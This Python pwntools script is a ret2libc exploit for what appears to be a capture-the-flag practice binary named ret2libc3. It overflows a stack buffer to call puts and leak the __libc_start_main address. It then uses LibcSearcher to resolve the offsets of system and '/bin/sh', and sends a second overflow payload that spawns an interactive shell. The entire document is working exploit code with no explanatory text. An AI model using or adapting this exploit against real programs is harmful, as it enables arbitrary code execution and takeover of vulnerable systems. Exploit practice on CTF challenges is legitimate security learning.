from pwn import *
from LibcSearcher import *
#libc = ELF('libc.so.6')
ret2 = ELF('ret2libc3')

p = process('./ret2libc3')

put_plt = ret2.plt['puts']
main_addr = ret2.symbols['main']
libc_main_addr = ret2.got['__libc_start_main']

playload = 'A'*112 + p32(put_plt) + p32(main_addr) + p32(libc_main_addr)
p.sendlineafter('Can you find it !?',playload)

libc_main_real = u32(p.recv(4))
print hex(libc_main_real)

#system_addr = libc_main_real - ( libc.symbols['__libc_start_main'] - libc.symbols['system'] )
libc = LibcSearcher('__libc_start_main',libc_main_real)
database = libc_main_real - libc.dump('__libc_start_main')
#print hex(system_addr)
#bin_addr = libc_main_real - ( libc.symbols['__libc_start_main'] - next(libc.search('/bin/sh')) )
#print hex(bin_addr)

sys_addr = database + libc.dump('system')
bin_addr = database + libc.dump('str_bin_sh')

playload2 = 'A'*104 + p32(sys_addr) + 'BBBB' + p32(bin_addr)
p.sendline(playload2)
p.interactive()
